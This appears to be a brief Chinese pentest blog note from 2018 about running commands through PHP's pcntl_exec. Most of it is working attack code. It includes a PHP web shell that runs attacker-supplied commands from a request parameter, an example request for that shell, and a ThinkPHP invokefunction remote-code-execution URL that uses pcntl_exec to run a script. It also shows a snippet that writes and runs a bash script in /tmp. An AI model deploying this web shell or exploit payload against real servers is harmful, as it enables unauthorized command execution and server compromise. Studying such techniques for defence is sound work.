Title: pcntl_exec
Date: 2018-12-18
slug: pcntl_exec
Tag: Pentest


```
参数执行:
pcntl_exec("/bin/bash",array("-c","id > 1.txt")) //返回值可能是502

执行脚本:
pcntl_exec("/tmp/script")   //返回值502
```

```
返回值200
<?php
$cmd = $_REQUEST['cmd'];
if(function_exists('pcntl_exec')) {
    switch(pcntl_fork()){
     case 0:
        pcntl_exec($cmd[0], $cmd[1]);
    default:
          echo "case 111";
    }
} else {
        echo '不支持pcntl扩展';
}
?>


cmd[0]=/bin/bash&cmd[1][0]=-c&cmd[1][1]=id > /tmp/xxx.txt
/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=pcntl_exec&vars[1][0]=/bin/bash&vars[1][1][0]=/tmp/1.sh

```


```
<?php
header("Content-Type: text/plain");
$cmd="/tmp/exec";
@unlink($cmd);
@unlink("/tmp/output");
$c = "#!/usr/bin/env bash\nuname -a > /tmp/output\n";
file_put_contents($cmd, $c);
chmod($cmd, 0777);

switch (pcntl_fork()) {
  case 0:
    $ret = pcntl_exec($cmd);
    exit("case 0");
  default:
    echo "case 1";
    break;
}
```
上面执行的脚本那行chmod不可以少





* https://bugs.leavesongs.com/%E8%BF%90%E7%BB%B4%E5%AE%89%E5%85%A8/lnmp%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BAphp%E6%B2%99%E7%9B%92%E7%BB%95%E8%BF%87-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/
